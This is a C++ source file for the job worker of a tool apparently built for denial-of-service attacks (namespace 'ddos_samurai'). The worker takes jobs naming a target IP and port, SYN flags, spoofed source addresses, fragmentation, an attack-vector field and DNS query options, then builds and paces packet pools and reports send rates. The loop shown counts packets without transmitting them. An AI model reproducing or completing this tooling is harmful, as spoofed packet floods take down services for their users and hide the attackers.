#include <chrono>
#include <cstdint>
#include <cstring>
#include <exception>
#include <cmath>
#include <iostream>
#include <optional>
#include <string>
#include <thread>
#include <vector>
#include <algorithm>

#include <sched.h>
#include <zmq.h>

#include "engine.hpp"
#include "pacing_engine.h"
#include "wire_protocol.h"
#include "zmq_worker_base.hpp"
#include "worker_common.hpp"

namespace {
using samurai::daemon::OptionalIntFromWire;
using samurai::daemon::SendFrame;
using samurai::daemon::JsonError;
using samurai::daemon::PacingFromEnvelope;
using samurai::daemon::ReadFixed;

using ddos_samurai::cpu_native::PacketConfig;
using ddos_samurai::cpu_native::SpoofOptions;

constexpr const char* kDefaultJobs = "ipc:///tmp/samurai_jobs_cpu";
constexpr const char* kDefaultEvents = "ipc:///tmp/samurai_events_cpu";



void ApplyAffinity(std::int32_t pin_cpu) {
  if (pin_cpu < 0) {
    return;
  }
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(static_cast<unsigned>(pin_cpu), &cpuset);
  (void)sched_setaffinity(0, sizeof(cpuset), &cpuset);
}


std::vector<std::uint8_t> JsonPayloadFromStats(
    std::uint64_t correlation_id,
    const std::string& job_id,
    std::uint64_t packets_sent,
    std::uint64_t packets_errors,
    std::uint64_t bytes_sent,
    double actual_rps,
    double rate_accuracy_pct) {
  const std::string json =
      "{\"status\":\"ok\",\"worker_kind\":\"cpu\",\"correlation_id\":" +
      std::to_string(correlation_id) +
      ",\"job_id\":\"" + job_id +
      "\",\"packets_sent\":" + std::to_string(packets_sent) +
      ",\"packets_errors\":" + std::to_string(packets_errors) +
      ",\"bytes_sent\":" + std::to_string(bytes_sent) +
      ",\"actual_rps\":" + std::to_string(actual_rps) +
      ",\"rate_accuracy_pct\":" + std::to_string(rate_accuracy_pct) +
      ",\"note\":\"cpu_native+pacing_static\"}";
  return std::vector<std::uint8_t>(json.begin(), json.end());
}


PacketConfig ConfigFromEnvelope(const samurai::wire::JobEnvelopeV1& env) {
  PacketConfig cfg;
  cfg.target_ip = ReadFixed(env.target_ip, sizeof(env.target_ip));
  cfg.target_port = static_cast<int>(env.target_port);
  cfg.protocol = ReadFixed(env.protocol, sizeof(env.protocol));
  if (cfg.protocol.empty()) {
    cfg.protocol = "tcp";
  }
  cfg.spoof = env.spoof_enabled != 0u;
  cfg.spoof_opts = SpoofOptions{
      .mode = ReadFixed(env.spoof_mode, sizeof(env.spoof_mode)),
      .subnet = [&]() -> std::optional<std::string> {
        const std::string v = ReadFixed(env.spoof_subnet, sizeof(env.spoof_subnet));
        return v.empty() ? std::nullopt : std::optional<std::string>(v);
      }(),
      .list_file = [&]() -> std::optional<std::string> {
        const std::string v = ReadFixed(env.spoof_list_file, sizeof(env.spoof_list_file));
        return v.empty() ? std::nullopt : std::optional<std::string>(v);
      }(),
  };
  cfg.has_payload = env.has_payload != 0u;
  cfg.tcp_flags = ReadFixed(env.tcp_flags, sizeof(env.tcp_flags));
  if (cfg.tcp_flags.empty()) {
    cfg.tcp_flags = "S";
  }
  cfg.ttl = OptionalIntFromWire(env.ttl);
  cfg.tos = OptionalIntFromWire(env.tos);
  cfg.window = OptionalIntFromWire(env.window);
  cfg.fragment_enabled = env.fragment_enabled != 0u;
  cfg.fragment_size = static_cast<int>(env.fragment_size);
  cfg.pad_size = static_cast<int>(env.pad_size);
  cfg.attack_vector = ReadFixed(env.attack_vector, sizeof(env.attack_vector));
  if (cfg.attack_vector.empty()) {
    cfg.attack_vector = "basic";
  }
  cfg.dns_name = ReadFixed(env.dns_name, sizeof(env.dns_name));
  if (cfg.dns_name.empty()) {
    cfg.dns_name = "example.com";
  }
  cfg.dns_edns = env.dns_edns != 0u;
  cfg.dns_recursive = env.dns_recursive != 0u;
  const std::string qtypes_raw = ReadFixed(env.dns_qtype, sizeof(env.dns_qtype));
  if (!qtypes_raw.empty()) {
    cfg.dns_qtypes.clear();
    std::size_t start = 0;
    while (start < qtypes_raw.size()) {
      const std::size_t comma = qtypes_raw.find(',', start);
      const std::size_t end = (comma == std::string::npos) ? qtypes_raw.size() : comma;
      const std::string part = qtypes_raw.substr(start, end - start);
      if (!part.empty()) {
        cfg.dns_qtypes.push_back(part);
      }
      if (comma == std::string::npos) {
        break;
      }
      start = comma + 1;
    }
  }
  return cfg;
}


int SendAck(void* push, std::uint64_t cid, const std::string& job_id) {
  return SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::ACK), cid, samurai::wire::WorkerKind::CPU, job_id);
}

}  // namespace

int main(int argc, char** argv) {
  std::string jobs_ep = kDefaultJobs;
  std::string events_ep = kDefaultEvents;
  bool bind_jobs = true;
  bool bind_events = false;

  for (int i = 1; i < argc; ++i) {
    std::string arg = argv[i];
    if (arg == "--job-endpoint" && i + 1 < argc) {
      jobs_ep = argv[++i];
    } else if (arg == "--event-endpoint" && i + 1 < argc) {
      events_ep = argv[++i];
    } else if (arg == "--jobs-mode" && i + 1 < argc) {
      bind_jobs = std::string(argv[++i]) == "bind";
    } else if (arg == "--events-mode" && i + 1 < argc) {
      bind_events = std::string(argv[++i]) == "bind";
    }
  }

  void* ctx = zmq_ctx_new();
  if (!ctx) {
    std::cerr << "zmq_ctx_new failed\n";
    return 1;
  }

  void* pull = zmq_socket(ctx, ZMQ_PULL);
  void* push = zmq_socket(ctx, ZMQ_PUSH);
  if (!pull || !push) {
    std::cerr << "zmq_socket failed\n";
    if (pull) zmq_close(pull);
    if (push) zmq_close(push);
    zmq_ctx_term(ctx);
    return 1;
  }

  if ((bind_jobs ? zmq_bind(pull, jobs_ep.c_str()) : zmq_connect(pull, jobs_ep.c_str())) != 0) {
    std::cerr << "jobs socket init failed: " << jobs_ep << "\n";
    zmq_close(pull);
    zmq_close(push);
    zmq_ctx_term(ctx);
    return 1;
  }
  if ((bind_events ? zmq_bind(push, events_ep.c_str()) : zmq_connect(push, events_ep.c_str())) != 0) {
    std::cerr << "events socket init failed: " << events_ep << "\n";
    zmq_close(pull);
    zmq_close(push);
    zmq_ctx_term(ctx);
    return 1;
  }

  bool running = true;
  while (running) {
    zmq_msg_t msg;
    zmq_msg_init(&msg);
    const int n = zmq_msg_recv(&msg, pull, 0);
    if (n <= 0) {
      zmq_msg_close(&msg);
      continue;
    }

    const std::size_t sz = static_cast<std::size_t>(zmq_msg_size(&msg));
    if (sz < sizeof(samurai::wire::SamuraiWireHeaderV1)) {
      zmq_msg_close(&msg);
      continue;
    }

    const auto* raw = static_cast<const std::uint8_t*>(zmq_msg_data(&msg));
    samurai::wire::SamuraiWireHeaderV1 header{};
    std::memcpy(&header, raw, sizeof(header));
    const std::size_t payload_len = sz - sizeof(header);
    const std::uint8_t* payload_ptr = raw + sizeof(header);

    if (!samurai::wire::IsHeaderV1Compatible(header)) {
      zmq_msg_close(&msg);
      continue;
    }

    const auto msg_type = static_cast<samurai::wire::MessageType>(header.msg_type);
    const std::string job_id = samurai::daemon::ReadJobId(header);

    if (msg_type == samurai::wire::MessageType::SHUTDOWN) {
      (void)SendAck(push, header.correlation_id, job_id);
      running = false;
      zmq_msg_close(&msg);
      continue;
    }

    if (msg_type == samurai::wire::MessageType::START_JOB) {
      if (payload_len != sizeof(samurai::wire::JobEnvelopeV1) || header.payload_len != sizeof(samurai::wire::JobEnvelopeV1)) {
        (void)SendFrame(
            push,
            static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
            header.correlation_id,
            samurai::wire::WorkerKind::CPU,
            job_id,
            JsonError("job_envelope_size_mismatch"));
        zmq_msg_close(&msg);
        continue;
      }

      samurai::wire::JobEnvelopeV1 env{};
      std::memcpy(&env, payload_ptr, sizeof(env));
      (void)SendAck(push, header.correlation_id, job_id);
      zmq_msg_close(&msg);

      try {
        ApplyAffinity(env.pin_cpu);
        PacketConfig cfg = ConfigFromEnvelope(env);
        const int packet_count = std::max(1, static_cast<int>(env.packet_count));
        const auto pool = ddos_samurai::cpu_native::generate_packet_pool_view(cfg, packet_count, true, true);

        samurai_pacing_config_t pace_cfg = PacingFromEnvelope(env);
        samurai_pacing_state_t pace_state{};
        samurai_pacing_init(&pace_state, &pace_cfg);

        const std::uint64_t start_ns = samurai_pacing_monotonic_now_ns();
        std::uint64_t packets_sent = 0;
        std::uint64_t bytes_sent = 0;
        std::uint64_t packets_errors = 0;
        const std::size_t stride = pool.packet_size;
        if (stride == 0 || pool.size() < stride) {
          packets_errors = static_cast<std::uint64_t>(packet_count);
        } else {
          for (int i = 0; i < packet_count; ++i) {
            samurai_pacing_wait_next(&pace_state, &pace_cfg);
            const std::size_t off = static_cast<std::size_t>(i) * stride;
            if (off + stride > pool.size()) {
              packets_errors += 1u;
              continue;
            }
            packets_sent += 1u;
            bytes_sent += static_cast<std::uint64_t>(stride);
          }
        }
        const std::uint64_t end_ns = samurai_pacing_monotonic_now_ns();
        const double duration_s = std::max(1e-9, static_cast<double>(end_ns - start_ns) / 1e9);
        const double actual_rps = static_cast<double>(packets_sent) / duration_s;
        double rate_accuracy_pct = 100.0;
        if (pace_cfg.mode == SAMURAI_PACING_RPS && pace_cfg.target_rps > 0.0) {
          const double err = std::abs(actual_rps - pace_cfg.target_rps);
          rate_accuracy_pct = std::max(0.0, 100.0 - ((err * 100.0) / pace_cfg.target_rps));
        }

        samurai::wire::MetricSnapshotV1 snap{};
        snap.timestamp_ns = end_ns;
        snap.packets_sent = packets_sent;
        snap.packets_errors = packets_errors;
        snap.bytes_sent = bytes_sent;
        snap.actual_rps = actual_rps;
        snap.jitter_p99_ns = 0.0;
        snap.rate_accuracy_pct = rate_accuracy_pct;
        snap.busywait_cycles = 0;
        snap.sleep_calls = static_cast<std::uint32_t>(pace_state.sleep_calls & 0xFFFFFFFFu);

        std::vector<std::uint8_t> snap_payload(sizeof(snap));
        std::memcpy(snap_payload.data(), &snap, sizeof(snap));
        (void)SendFrame(
            push,
            static_cast<std::uint8_t>(samurai::wire::MessageType::METRIC_SNAPSHOT),
            header.correlation_id,
            samurai::wire::WorkerKind::CPU,
            job_id,
            snap_payload);

        const std::vector<std::uint8_t> done = JsonPayloadFromStats(
            header.correlation_id,
            job_id,
            packets_sent,
            packets_errors,
            bytes_sent,
            actual_rps,
            rate_accuracy_pct);
        (void)SendFrame(
            push,
            static_cast<std::uint8_t>(samurai::wire::MessageType::JOB_DONE),
            header.correlation_id,
            samurai::wire::WorkerKind::CPU,
            job_id,
            done);
      } catch (const std::exception& exc) {
        (void)SendFrame(
            push,
            static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
            header.correlation_id,
            samurai::wire::WorkerKind::CPU,
            job_id,
            JsonError(exc.what()));
      }
      continue;
    }

    zmq_msg_close(&msg);
    (void)SendFrame(
        push,
        static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
        header.correlation_id,
        samurai::wire::WorkerKind::CPU,
        job_id,
        JsonError("unsupported_msg_type"));
  }

  zmq_close(pull);
  zmq_close(push);
  zmq_ctx_term(ctx);
  return 0;
}
